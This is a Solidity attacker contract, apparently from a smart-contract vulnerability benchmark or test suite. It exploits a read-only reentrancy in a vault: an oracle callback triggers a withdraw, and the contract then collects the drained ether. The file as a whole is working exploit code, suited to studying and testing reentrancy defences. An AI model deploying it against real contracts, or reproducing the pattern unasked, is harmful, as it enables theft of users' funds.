// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../../cross-contract/read-only/ReadOnly_ree3.sol";

contract ReadOnly_ree3_Attacker is IAdjuster {
    ReadOnly_ree3 public v;
    ReadOnly_ree3_Oracle public o;
    bool public performAttack;
    address private owner;

    constructor(address payable _v, address _o) {
        v = ReadOnly_ree3(_v);
        o = ReadOnly_ree3_Oracle(_o);
        owner = msg.sender;
    }

    function attack() public payable {
        payable(address(v)).transfer(msg.value);
        o.register(address(this));
        performAttack = true;
    }

    function adjust(uint256 increment) public returns (uint256) {
        if (performAttack) {
            performAttack = false;
            v.withdraw();
        }
        return increment * 0;
    }

    function collectEther() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
